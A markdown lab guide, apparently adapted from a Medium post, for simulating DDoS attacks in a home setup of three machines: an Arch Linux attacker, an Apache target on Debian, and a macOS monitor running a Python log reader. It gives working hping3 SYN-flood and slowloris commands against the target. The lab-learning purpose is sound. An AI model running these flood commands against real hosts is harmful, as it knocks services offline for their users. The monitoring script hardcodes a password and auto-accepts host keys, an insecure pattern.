## disclaimer this article inspired and take by

https://medium.com/@sebastienwebdev/ddos-simulation-910bd66c4220

# DDoS Simulation Guide

## Overview

- **ARM macOS**: Used for coordination, monitoring, and logging.
- **Arch Linux**: Used as the attacker machine to simulate DDoS attacks.
- **ARM Debian Server**: Used as the target server to withstand and log DDoS attacks.

## Step-by-Step Instructions

### Step 1: Setup Coordination & Monitoring on ARM macOS

#### Install Necessary Tools

```bash
$ brew install python3
```

#### Create SSH Key for Password-less Authentication

Generate SSH keys on `mymac` and copy them to `archlinux` and `debian server`:

```bash
$ ssh-keygen -t rsa
$ ssh-copy-id tuser@xx.xxx.xx.xx
$ ssh-copy-id tuser@xx.xxx.xx.xx
```

### Step 2: Set Up ARM Debian Server as the Target Server

#### Update and Upgrade

```bash
$ sudo apt update && sudo apt upgrade -y
```

#### Install a Web Server

Install Apache or Nginx to act as the target server:

```bash
$ sudo apt install apache2 -y
```

#### Start the Web Server

```bash
$ sudo systemctl start apache2
$ sudo systemctl enable apache2
```

#### Configure Logging

Ensure Apache logs are enabled for monitoring the DDoS attack:

```bash
$ sudo nano /etc/apache2/apache2.conf
```

Make sure the `LogLevel` is set to `info` or higher:

```plaintext
LogLevel info
```

Restart Apache to apply changes:

```bash
$ sudo systemctl restart apache2
```

### Step 3: Set Up ArchLinux as the Attacker Machine

#### Update and Upgrade

```bash
$ yay -Sy update && yay -Sy upgrade
```

#### Install DDoS Tools

Install common tools used for simulating DDoS attacks, such as `hping3` and `slowloris`:

```bash
$ sudo yay -S hping slowloris
```

#### Simulate DDoS Attack with hping3

Run a SYN flood attack:

```bash
$ sudo hping3 -S --flood -V -p 80 xx.xxx.xx.xx
```

#### Simulate DDoS Attack with Slowloris

Run a Slowloris attack:

```bash
$ slowloris xx.xxx.xx.xx
```

### Step 4: Monitoring and Logging on ARM macOS

#### Set Up a Monitoring Script

Create a script to monitor Apache logs for signs of DDoS attacks. Save it as `monitor_logs.py`:

```python
import paramiko

ubuntu_ip = "xx.xxx.xx.xx"
user = "xxxx"
password = "your_password"
log_file = "/var/log/apache2/access.log"

def monitor_logs():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(ubuntu_ip, username=user, password=password)
    sftp = ssh.open_sftp()
    with sftp.open(log_file, 'r') as f:
        while True:
            line = f.readline()
            if not line:
                break
            print(line.strip())
    sftp.close()
    ssh.close()

if __name__ == "__main__":
    monitor_logs()
```
